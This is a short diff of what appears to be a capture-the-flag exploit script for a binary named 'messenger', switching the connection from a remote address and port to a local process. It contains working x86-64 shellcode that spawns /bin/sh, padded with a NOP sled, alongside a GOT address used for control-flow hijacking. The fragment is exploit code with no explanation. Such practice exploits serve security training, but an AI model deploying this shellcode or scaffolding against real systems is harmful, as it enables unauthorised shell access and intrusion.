@@ -8,8 +8,8 @@ exit_got = 0x602070
 shellcode = "\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"
 shellcode = shellcode.rjust(32, '\x90')
 
-#p = process('messenger')
-p = remote('110.10.212.137', 3333)
+p = process('messenger')
+#p = remote('110.10.212.137', 3333)
 
 def r(msg):
   response = p.recvuntil(msg)
